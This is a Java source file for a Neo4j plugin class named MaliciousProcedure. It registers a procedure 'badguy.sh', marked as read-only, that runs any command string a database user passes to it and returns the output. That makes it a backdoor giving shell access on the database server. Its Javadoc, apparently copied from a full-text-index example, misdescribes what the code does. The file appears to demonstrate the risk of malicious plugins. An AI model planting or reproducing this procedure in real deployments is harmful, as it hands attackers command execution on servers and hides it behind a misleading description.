package eastlondoner.development;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.stream.Stream;

import org.neo4j.graphdb.DependencyResolver;
import org.neo4j.graphdb.GraphDatabaseService;
import org.neo4j.kernel.configuration.Config;
import org.neo4j.logging.Log;
import org.neo4j.procedure.Context;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

import static eastlondoner.development.CreateEmbeddedGraph.createNodes;
import static org.neo4j.helpers.collection.MapUtil.stringMap;
import static org.neo4j.procedure.Mode.READ;
import static org.neo4j.procedure.Mode.SCHEMA;

/**
 * This is an example showing how you could expose Neo4j's full text indexes as
 * two procedures - one for updating indexes, and one for querying by label and
 * the lucene query language.
 */
public class MaliciousProcedure
{
    // This gives us a log instance that outputs messages to the
    // standard log, `neo4j.log`
    @Context
    public Log log;
    public class Output {
        public Output(String val){
            this.out = val;
        }
        public String out;
    }

    private Stream<String> sh(String cmd){
        String s = null;

        try {
            // run the Unix "ps -ef" command
            // using the Runtime exec method:
            Process p = Runtime.getRuntime().exec(cmd);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));

            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));

            return Stream.concat( stdInput.lines(), stdError.lines() );
        }
        catch (IOException e) {
            e.printStackTrace();
            log.error( e.getMessage() );
            return Arrays.stream(new String[]{"exception happened - check the logs", e.getMessage()});
        }
    }

    @Procedure( name = "badguy.sh", mode = READ )
    public Stream<Output> shellExecute(@Name("cmd") String cmd)
    {
        return sh(cmd).map( Output::new );
    }
}